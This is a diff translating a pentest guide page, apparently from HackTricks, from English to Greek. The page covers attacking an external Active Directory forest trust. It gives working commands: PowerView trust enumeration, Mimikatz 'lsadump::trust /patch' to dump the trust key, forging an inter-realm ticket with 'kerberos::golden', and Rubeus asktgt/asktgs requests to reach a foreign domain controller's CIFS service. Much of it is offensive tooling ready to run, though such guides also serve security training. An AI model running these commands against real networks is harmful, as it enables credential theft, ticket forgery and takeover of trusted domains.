@@ -1,13 +1,12 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# Εξωτερικό Δάσος Τομέα - Μονοκατεύθυνση (Εισερχόμενη) ή αμφίδρομη
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+Σε αυτό το σενάριο, ένας εξωτερικός τομέας σας εμπιστεύεται (ή και οι δύο εμπιστεύονται ο ένας τον άλλον), οπότε μπορείτε να αποκτήσετε κάποια πρόσβαση σε αυτόν.
 
-## Enumeration
+## Καταμέτρηση
 
-First of all, you need to **enumerate** the **trust**:
-
+Πρώτα απ' όλα, πρέπει να **καταμετρήσετε** την **εμπιστοσύνη**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -32,7 +31,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -57,48 +56,42 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+Στην προηγούμενη αρίθμηση βρέθηκε ότι ο χρήστης **`crossuser`** είναι μέσα στην ομάδα **`External Admins`** που έχει **Admin access** μέσα στο **DC του εξωτερικού τομέα**.
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## Αρχική Πρόσβαση
 
-## Initial Access
+Αν **δεν μπορέσατε** να βρείτε καμία **ειδική** πρόσβαση του χρήστη σας στον άλλο τομέα, μπορείτε ακόμα να επιστρέψετε στη Μεθοδολογία AD και να προσπαθήσετε να **privesc από έναν μη προνομιούχο χρήστη** (πράγματα όπως το kerberoasting για παράδειγμα):
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+Μπορείτε να χρησιμοποιήσετε τις **Powerview functions** για να **enumerate** τον **άλλο τομέα** χρησιμοποιώντας την παράμετρο `-Domain` όπως στο:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
-
 {{#ref}}
 ./
 {{#endref}}
 
-## Impersonation
+## Υποκατάσταση
 
-### Logging in
+### Σύνδεση
 
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+Χρησιμοποιώντας μια κανονική μέθοδο με τα διαπιστευτήρια των χρηστών που έχουν πρόσβαση στο εξωτερικό domain, θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
+### Κατάχρηση Ιστορικού SID
 
-### SID History Abuse
+Μπορείτε επίσης να καταχραστείτε το [**Ιστορικό SID**](sid-history-injection.md) σε ένα δάσος εμπιστοσύνης.
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+Εάν ένας χρήστης μεταφερθεί **από ένα δάσος σε άλλο** και **η Φιλτράρισμα SID δεν είναι ενεργοποιημένη**, γίνεται δυνατή η **προσθήκη ενός SID από το άλλο δάσος**, και αυτό το **SID** θα **προστεθεί** στο **token του χρήστη** κατά την αυθεντικοποίηση **μέσω της εμπιστοσύνης**.
 
 > [!WARNING]
-> As a reminder, you can get the signing key with
+> Ως υπενθύμιση, μπορείτε να αποκτήσετε το κλειδί υπογραφής με
 >
 > ```powershell
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+Μπορείτε να **υπογράψετε με** το **έμπιστο** κλειδί ένα **TGT που προσποιείται** τον χρήστη του τρέχοντος τομέα.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -109,9 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
-### Full way impersonating the user
-
+### Πλήρης τρόπος προσποίησης του χρήστη
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -125,6 +116,4 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
-
